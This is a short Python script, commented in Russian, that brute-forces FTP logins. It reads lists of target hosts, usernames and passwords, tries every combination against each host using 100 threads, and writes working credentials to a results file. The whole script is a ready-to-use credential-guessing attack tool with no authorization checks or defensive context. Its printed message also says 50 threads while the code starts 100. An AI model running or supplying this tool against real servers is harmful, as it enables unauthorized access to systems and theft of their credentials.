import ftplib
import threading
from queue import Queue
def ftp_brute_force(host, username, password, results):
    """Функция для попытки подключения к FTP"""
    try:
        ftp = ftplib.FTP(host, timeout=9)
        ftp.login(username, password)
        result = f'Success! Host: {host} | Username: {username} | Password: {password}'
        print(result)
        with open('FTP_results.txt', 'a') as f:
              f.write(f'{result}\n')
        results.append(result)
        ftp.quit()
    except ftplib.error_perm:
        print(f'Failed: {host} | {username}:{password}')
    except Exception as e:
        print(f'Error with {host}: {e}')

def worker(target_queue, results):
    """Функция рабочего потока"""
    while not target_queue.empty():
        try:
            host, username, password = target_queue.get_nowait()
            ftp_brute_force(host, username, password, results)
            target_queue.task_done()
        except:
            break

def main():
    # Чтение целей
    with open('targets.txt', 'r') as f:
        targets = f.read().split()
    
    # Чтение логинов
    with open('ftp_login.txt', 'r') as f:
        users = f.read().split()
    
    # Чтение паролей
    with open('ftp_password.txt', 'r') as f:
        passwords = f.read().split()
    
    # Создание очереди задач
    target_queue = Queue()
    results = []
    
    # Заполнение очереди всеми комбинациями
    for host in targets:
        for username in users:
            for password in passwords:
                target_queue.put((host, username, password))
    
    print(f'Total tasks: {target_queue.qsize()}')
    print('Starting brute force with 50 threads...')
    
    # Создание и запуск потоков
    threads = []
    for i in range(100):
        thread = threading.Thread(target=worker, args=(target_queue, results))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Ожидание завершения всех задач
    target_queue.join()
    
    # Вывод результатов
    print('\n' + '='*50)
    print('SCAN COMPLETED')
    print('='*50)
    if results:
        print('SUCCESSFUL LOGINS:')
        for result in results:
            print(result)
    else:
        print('No successful logins found.')

if __name__ == "__main__":
    main()

